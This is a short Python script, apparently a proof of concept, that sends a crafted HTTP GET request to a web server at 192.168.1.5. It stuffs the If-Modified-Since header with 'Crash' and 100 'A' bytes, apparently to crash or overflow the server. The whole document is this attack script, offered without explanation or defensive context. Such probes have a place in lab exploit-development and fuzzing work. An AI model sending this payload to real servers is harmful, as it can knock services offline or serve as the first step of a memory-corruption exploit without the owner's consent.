import socket
import sys
ip = "192.168.1.5"
port = 80
junk = "\x41"*100
req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.5\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: keep-alive\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since:"
req += " Crash " + junk + "\r\n"
req += "\r\n"
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect((ip, port))
sc.send(req)
sc.close()
